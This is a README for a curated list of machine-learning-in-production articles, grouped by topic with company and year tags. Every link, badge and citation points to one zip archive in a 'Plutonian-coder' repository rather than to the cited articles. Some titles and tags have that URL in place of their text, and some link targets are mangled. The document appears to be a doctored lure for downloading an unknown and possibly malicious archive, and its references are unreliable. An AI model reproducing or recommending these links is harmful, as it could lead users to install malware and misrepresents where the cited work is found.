# applied-ml
Curated papers, articles, and blogs on **data science & machine learning in production**. ⚙️

[![contributions welcome](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [![Summaries](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip%20tweets-%https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ![HitCount](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)

Figuring out how to implement your ML project? Learn how other organizations did it:

- **How** the problem is framed 🔎(e.g., personalization as recsys vs. search vs. sequences)
- **What** machine learning techniques worked ✅ (and sometimes, what didn't ❌)
- **Why** it works, the science behind it with research, literature, and references 📂
- **What** real-world results were achieved (so you can better assess ROI ⏰💰📈)

P.S., Want a summary of ML advancements? 👉[`ml-surveys`](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)

P.P.S, Looking for guides and interviews on applying ML? 👉[`applyingML`](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)

**Table of Contents**

1. [Data Quality](#data-quality)
2. [Data Engineering](#data-engineering)
3. [Data Discovery](#data-discovery)
4. [Feature Stores](#feature-stores)
5. [Classification](#classification)
6. [Regression](#regression)
7. [Forecasting](#forecasting)
8. [Recommendation](#recommendation)
9. [Search & Ranking](#search--ranking)
10. [Embeddings](#embeddings)
11. [Natural Language Processing](#natural-language-processing)
12. [Sequence Modelling](#sequence-modelling)
13. [Computer Vision](#computer-vision)
14. [Reinforcement Learning](#reinforcement-learning)
15. [Anomaly Detection](#anomaly-detection)
16. [Graph](#graph)
17. [Optimization](#optimization)
18. [Information Extraction](#information-extraction)
19. [Weak Supervision](#weak-supervision)
20. [Generation](#generation)
21. [Audio](#audio)
22. [Privacy-Preserving Machine Learning](#privacy-preserving-machine-learning)
23. [Validation and A/B Testing](#validation-and-ab-testing)
24. [Model Management](#model-management)
25. [Efficiency](#efficiency)
26. [Ethics](#ethics)
27. [Infra](#infra)
28. [MLOps Platforms](#mlops-platforms)
29. [Practices](#practices)
30. [Team Structure](#team-structure)
31. [Fails](#fails)

## Data Quality
1. [Reliable and Scalable Data Ingestion at Airbnb](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2016`
2. [Monitoring Data Quality at Scale with Statistical Modeling](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2017`
3. [Data Management Challenges in Production Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2017`
4. [Automating Large-Scale Data Quality Verification](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip))`Amazon` `2018`
5. [Meet Hodor — Gojek’s Upstream Data Quality Tool](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Gojek` `2019`
6. [Data Validation for Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2019`
6. [An Approach to Data Quality for Netflix Personalization Systems](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2020`
7. [Improving Accuracy By Certainty Estimation of Human Decisions, Labels, and Raters](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2020`

## Data Engineering
1. [Zipline: Airbnb’s Machine Learning Data Management Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2018`
2. [Sputnik: Airbnb’s Apache Spark Framework for Data Engineering](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2020`
3. [Unbundling Data Science Workflows with Metaflow and AWS Step Functions](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2020`
4. [How DoorDash is Scaling its Data Platform to Delight Customers and Meet Growing Demand](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
5. [Revolutionizing Money Movements at Scale with Strong Data Consistency](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2020`
6. [Zipline - A Declarative Feature Engineering Framework](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2020`
7. [Automating Data Protection at Scale, Part 1](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Part 2](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Airbnb` `2021`
8. [Real-time Data Infrastructure at Uber](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2021`
9. [Introducing Fabricator: A Declarative Feature Engineering Framework](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2022`
10. [Functions & DAGs: introducing Hamilton, a microframework for dataframe generation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix` `2021`
11. [Optimizing Pinterest’s Data Ingestion Stack: Findings and Learnings](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2022`
12. [Lessons Learned From Running Apache Airflow at Scale](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Shopify` `2022`
13. [Understanding Data Storage and Ingestion for Large-Scale Deep Recommendation Model Training](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Meta` `2022`
14. [Data Mesh — A Data Movement and Processing Platform @ Netflix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2022`
15. [Building Scalable Real Time Event Processing with Kafka and Flink](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2022`

## Data Discovery
1. [Apache Atlas: Data Goverance and Metadata Framework for Hadoop](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Apache`
2. [Collect, Aggregate, and Visualize a Data Ecosystem's Metadata](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `WeWork`
3. [Discovery and Consumption of Analytics Data at Twitter](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Twitter` `2016`
4. [Democratizing Data at Airbnb](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2017`
5. [Databook: Turning Big Data into Knowledge with Metadata at Uber](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2018`
6. [Metacat: Making Big Data Discoverable and Meaningful at Netflix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Netflix` `2018`
7. [Amundsen — Lyft’s Data Discovery & Metadata Engine](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lyft` `2019`
8. [Open Sourcing Amundsen: A Data Discovery And Metadata Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Lyft` `2019`
9. [DataHub: A Generalized Metadata Search & Discovery Tool](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2019`
10. [Amundsen: One Year Later](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lyft` `2020`
11. [Using Amundsen to Support User Privacy via Metadata Collection at Square](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Square` `2020`
12. [Turning Metadata Into Insights with Databook](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2020`
13. [DataHub: Popular Metadata Architectures Explained](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
14. [How We Improved Data Discovery for Data Scientists at Spotify](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2020` 
15. [How We’re Solving Data Discovery Challenges at Shopify](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Shopify` `2020`
16. [Nemo: Data discovery at Facebook](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2020`
17. [Exploring Data @ Netflix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Netflix` `2021`

## Feature Stores
1. [Distributed Time Travel for Feature Generation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2016`
2. [Building the Activity Graph, Part 2 (Feature Storage Section)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2017`
3. [Fact Store at Scale for Netflix Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2018`
4. [Zipline: Airbnb’s Machine Learning Data Management Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2018`
5. [Feature Store: The missing data layer for Machine Learning pipelines?](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Hopsworks` `2018`
6. [Introducing Feast: An Open Source Feature Store for Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Gojek` `2019`
7. [Michelangelo Palette: A Feature Engineering Platform at Uber](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2019`
8. [The Architecture That Powers Twitter's Feature Store](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Twitter` `2019`
9. [Accelerating Machine Learning with the Feature Store Service](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Condé Nast` `2019` 
10. [Feast: Bridging ML Models and Data](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Gojek` `2020`
11. [Building a Scalable ML Feature Store with Redis, Binary Serialization, and Compression](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
12. [Rapid Experimentation Through Standardization: Typed AI features for LinkedIn’s Feed](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
13. [Building a Feature Store](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Monzo Bank` `2020`
14. [Butterfree: A Spark-based Framework for Feature Store Building](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `QuintoAndar` `2020`
15. [Building Riviera: A Declarative Real-Time Feature Engineering Framework](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2021`
16. [Optimal Feature Discovery: Better, Leaner Machine Learning Models Through Information Theory](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2021`
17. [ML Feature Serving Infrastructure at Lyft](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lyft` `2021`
18. [Near real-time features for near real-time personalization](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2022`
19. [Building the Model Behind DoorDash’s Expansive Merchant Selection](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2022`
20. [Open sourcing Feathr – LinkedIn’s feature store for productive machine learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2022`
21. [Evolution of ML Fact Store](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2022`
22. [Developing scalable feature engineering DAGs](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Metaflow + Hamilton` via `Outerbounds` `2022`
23. [Feature Store Design at Constructor](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip` `2023`


## Classification
1. [Prediction of Advertiser Churn for Google AdWords](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2010`
2. [High-Precision Phrase-Based Document Classification on a Modern Scale](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip~https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2011`
3. [Chimera: Large-scale Classification using Machine Learning, Rules, and Crowdsourcing](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip%https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Walmart` `2014`
4. [Large-scale Item Categorization in e-Commerce Using Multiple Recurrent Neural Networks](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `NAVER` `2016`
5. [Learning to Diagnose with LSTM Recurrent Neural Networks](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2017`
6. [Discovering and Classifying In-app Message Intent at Airbnb](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2019`
7. [Teaching Machines to Triage Firefox Bugs](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Mozilla` `2019`
8. [Categorizing Products at Scale](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Shopify` `2020`
9. [How We Built the Good First Issues Feature](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `GitHub` `2020`
10. [Testing Firefox More Efficiently with Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Mozilla` `2020`
11. [Using ML to Subtype Patients Receiving Digital Mental Health Interventions](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Microsoft` `2020`
12. [Scalable Data Classification for Security and Privacy](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2020`
13. [Uncovering Online Delivery Menu Best Practices with Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
14. [Using a Human-in-the-Loop to Overcome the Cold Start Problem in Menu Item Tagging](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
15. [Deep Learning: Product Categorization and Shelving](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Walmart` `2021`
16. [Large-scale Item Categorization for e-Commerce](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `DianPing`, `eBay` `2012`
17. [Semantic Label Representation with an Application on Multimodal Product Categorization](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Walmart` `2022`
18. [Building Airbnb Categories with ML and Human-in-the-Loop](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2022`


## Regression
1. [Using Machine Learning to Predict Value of Homes On Airbnb](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2017`
2. [Using Machine Learning to Predict the Value of Ad Requests](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Twitter` `2020`
3. [Open-Sourcing Riskquant, a Library for Quantifying Risk](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Netflix` `2020`
4. [Solving for Unobserved Data in a Regression Model Using a Simple Data Adjustment](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`

## Forecasting
1. [Engineering Extreme Event Forecasting at Uber with RNN](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2017`
2. [Forecasting at Uber: An Introduction](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2018`
3. [Transforming Financial Forecasting with Data Science and Machine Learning at Uber](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2018`
4. [Under the Hood of Gojek’s Automated Forecasting Tool](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Gojek` `2019`
5. [BusTr: Predicting Bus Travel Times from Real-Time Traffic](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
6. [Retraining Machine Learning Models in the Wake of COVID-19](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
7. [Automatic Forecasting using Prophet, Databricks, Delta Lake and MLflow](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Atlassian` `2020`
8. [Introducing Orbit, An Open Source Package for Time Series Inference and Forecasting](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Uber` `2021`
9. [Managing Supply and Demand Balance Through Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2021`
10. [Greykite: A flexible, intuitive, and fast forecasting library](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2021`
11. [The history of Amazon’s forecasting algorithm](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Amazon` `2021`
11. [DeepETA: How Uber Predicts Arrival Times Using Deep Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2022`
12. [Forecasting Grubhub Order Volume At Scale](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Grubhub` `2022`
13. [Causal Forecasting at Lyft (Part 1)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lyft` `2022`

## Recommendation
1. [https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip Recommendations: Item-to-Item Collaborative Filtering](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip~https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2003`
2. [Netflix Recommendations: Beyond the 5 stars (Part 1](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Part 2](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Netflix` `2012`
3. [How Music Recommendation Works — And Doesn’t Work](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2012`
4. [Learning to Rank Recommendations with the k -Order Statistic Loss](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2013`
5. [Recommending Music on Spotify with Deep Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2014`
6. [Learning a Personalized Homepage](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2015`
7. [The Netflix Recommender System: Algorithms, Business Value, and Innovation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Netflix` `2015`
7. [Session-based Recommendations with Recurrent Neural Networks](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Telefonica` `2016`
8. [Deep Neural Networks for YouTube Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `YouTube` `2016`
9. [E-commerce in Your Inbox: Product Recommendations at Scale](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Yahoo` `2016`
10. [To Be Continued: Helping you find shows to continue watching on Netflix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2016`
11. [Personalized Recommendations in LinkedIn Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2016`
12. [Personalized Channel Recommendations in Slack](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Slack` `2016`
13. [Recommending Complementary Products in E-Commerce Push Notifications](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2017`
14. [Artwork Personalization at Netflix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2017`
15. [A Meta-Learning Perspective on Cold-Start Recommendations for Items](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Twitter` `2017`
16. [Pixie: A System for Recommending 3+ Billion Items to 200+ Million Users in Real-Time](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Pinterest` `2017`
17. [Powering Search & Recommendations at DoorDash](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2017`
17. [How 20th Century Fox uses ML to predict a movie audience](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `20th Century Fox` `2018`
18. [Calibrated Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Netflix` `2018`
19. [Food Discovery with Uber Eats: Recommending for the Marketplace](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2018`
20. [Explore, Exploit, and Explain: Personalizing Explainable Recommendations with Bandits](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Spotify` `2018`
